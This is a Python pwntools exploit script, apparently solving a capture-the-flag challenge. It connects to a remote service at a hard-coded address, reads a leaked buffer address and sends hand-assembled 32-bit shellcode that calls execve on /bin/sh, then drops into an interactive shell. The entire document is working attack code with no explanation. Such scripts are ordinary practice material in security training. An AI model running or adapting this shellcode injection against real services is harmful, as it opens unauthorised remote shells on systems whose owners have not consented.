from pwn import *

#p = process("./shellcode")    #offest  13
p= remote("118.89.138.44", 30004)
context.log_level="debug"
#gdb.attach(proc.pidof(p)[0])

p.recvline()
addr = p.recvline()
sh_addr = int(addr.split("[")[1].split("]")[0][2:], 16)
p.recvline()

bin_sh = "/bin/sh\x00"

xor_ecx_ecx = "\x31\xc9"
xor_edx_edx = "\x31\xd2"
mov_ebx_bin_sh_addr = "\xbb" + p32(sh_addr+17)
mov_al_0xb = "\xb0\x0b"
int_80 = "\xcd\x80"    
jmp_short_12 = "\xeb\x0c"

shellcode_addr = p32(sh_addr)

payload = xor_ecx_ecx
payload += xor_edx_edx
payload+=mov_al_0xb
payload+=mov_ebx_bin_sh_addr
payload+=jmp_short_12
payload+=shellcode_addr
payload+=bin_sh
payload+=int_80




p.send(payload)

p.interactive()

